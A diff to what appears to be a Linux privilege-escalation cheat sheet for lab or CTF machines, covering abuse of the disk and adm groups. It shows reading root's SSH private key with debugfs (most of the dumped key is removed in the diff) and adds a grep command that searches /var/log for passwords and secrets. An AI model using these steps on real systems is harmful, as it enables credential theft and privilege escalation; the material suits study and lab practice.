@@ -27,9 +27,6 @@ uid=0(root) gid=0(root) groups=0(root)
 
 #### disk
 
-When a user is part of the `adm` **group**, he can **read log files** on the system.
-
-
 When a user is part of a `disk` **group**, he or she is granted direct access to the system **disks** and **partitions**.
 
 **Check Group**
@@ -61,33 +58,24 @@ debugfs:  cat /root/.ssh/id_rsa
 -----BEGIN OPENSSH PRIVATE KEY-----
 b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
 NhAAAAAwEAAQAAAQEAstkGmc1W+epM0w13VQrLO/wMNWwxFltotpa9elYJVXSlBc+PgF6I
-vnpxKBu/BFHAogrQt/i7MI3+64POT6X8nVWokKi9raRlaSFl2k8373C+lLyzt/JewfThUl
-VQINQ33vGIemNAbvJkqmMveAthMFEnAnNCnB6jct/Mhr74LjWgmX47tjrTxh3rdUF3SyVV
-J6HJMX015n+1md/zGX6CcjqaZGdCi5WY6xJHFkpp9yyszID8fmouUnQOq66C52Dbv5QNxV
-H8wSpH0HfTP3lqqMiXga8kUQGrHkfzmDT66wpTT6xvEHEa6zApu1PrDiW5K3EGhpTR/ylm
-GhcjB2iDrwAAA8CEFaHVhBWh1QAAAAdzc2gtcnNhAAABAQCy2QaZzVb56kzTDXdVCss7/A
-w1bDEWW2i2lr16VglVdKUFz4+AXoi+enEoG78EUcCiCtC3+Lswjf7rg85PpfydVaiQqL2t
-pGVpIWXaTzfvcL6UvLO38l7B9OFSVVAg1Dfe8Yh6Y0Bu8mSqYy94C2EwUScCc0KcHqNy38
-yGvvguNaCZfju2OtPGHet1QXdLJVUnockxfTXmf7WZ3/MZfoJyOppkZ0KLlZjrEkcWSmn3
-LKzMgPx+ai5SdA6rroLnYNu/lA3FUfzBKkfQd9M/eWqoyJeBryRRAaseR/OYNPrrClNPrG
-8QcRrrMCm7U+sOJbkrcQaGlNH/KWYaFyMHaIOvAAAAAwEAAQAAAQBFdRunJ6Qbsu7bGGO7
-11FOnnhvVvFJaX6lSq2TkU5WrdJZC18Dz7LzpsHDfeMVXlqdk+2zRRoNpVfXR30cWa5dvC
-KW67GeejYYOixAOHvUtciOIyr4yVwbn2rSeud/mGuKXetO/LTNYb3Onm6VBHZeOWYZAYJg
-91UrC9d2jTv9VZer6rtGJJKVdO8XrVgrciQU2GQgk0bBhcxXV4XOC7wYsoIdEuvkQG53Wu
-PZmbU0uoIE6MSVtm3dct7uEt190KAkUNxKOflDmWUgjcyKODeQj/pwUgRaXzNTRaa+tuBU
-9I0YwCS+LKt+KvyxO5DrbBDs5egoR3Pdz+Btcivn2i2hAAAAgCYIx3jhzhe5gwS5MnB6yW
-LlszD7QWvNm+hhoO8NqIhCEOPRMwMN7fNJ3ACfkh4Tin1YObuUba8Ekn3cJSCt7fZ9Rh4k
-tNsRoTZL6Az78gyAq2+OpZYQfLhxSDeypBRcih2ysvuXXZRVk1CEFe1XqNSn4wE82knfk/
-qAGo5gPpwiAAAAgQDnpzswlg0aC/RfTdrGh9HuHc8fJQUgBbt3ofKz+ulOKSnnmlfDasK9
-ATzM2Ee7HOmV0xXaAaXDsRXkgjoSQow9QWhDiLpR5eRbjjXEY3xcTpqQA1yNNqLkJmA1yP
-QnRSJDbLQspSdlC6YDzHa0FcwkK14b0IN2AM7+APXsAQ2MywAAAIEAxaUIB8cQoUkdEeGD
-QdVyjBpQQrjARPt5tmnTm1tmJpobkrpmTw7/VDYFUnJ/k7YYiUfsqyw7RJJQPYtnNTanBB
-IYohf/jZd0WBAEsTzmtYLHcjo+ln7gMDtyKVj+SqhkXDHaeOkzpW4Ev5RB+clZLRwrAWuu
-gaN4ZcqmaVXfzC0AAAALcm9vdEBzYXRvcmk=
------END OPENSSH PRIVATE KEY-----
 ```
 
 #### adm
+
+When a user is part of the `adm` **group**, he can **read log files** on the system.
+
+**Check Group**
+
+```
+low@vulnyx:~$ id
+uid=1000(low) gid=1000(low) groups=1000(low),4(adm)
+```
+
+**Abuse Group**
+
+```ruby
+low@vulnyx:~$ grep --color -Eri "pass|password|secret|db" /var/log 2>/dev/null
+```
 
 #### docker
 
